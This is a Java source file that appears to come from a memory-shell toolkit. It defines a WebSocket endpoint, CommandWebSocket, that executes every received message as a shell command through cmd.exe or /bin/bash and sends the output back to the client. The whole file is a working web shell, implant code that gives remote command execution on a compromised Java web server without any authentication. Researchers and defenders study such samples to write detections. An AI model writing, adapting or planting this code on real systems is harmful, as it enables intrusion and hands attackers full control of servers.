package com.reajason.javaweb.memshell.shelltool.command;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.InputStream;

/**
 * <a href="https://github.com/veo/wsMemShell">wsMemShell</a>
 *
 * @author ReaJason
 * @since 2024/12/9
 */
public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<String> {

    private Session session;

    @Override
    public void onMessage(String s) {
        try {
            Process process;
            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
            if (bool) {
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
            }
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            while ((i = inputStream.read()) != -1) {
                stringBuilder.append((char) i);
            }
            inputStream.close();
            process.waitFor();
            session.getBasicRemote().sendText(stringBuilder.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }
}
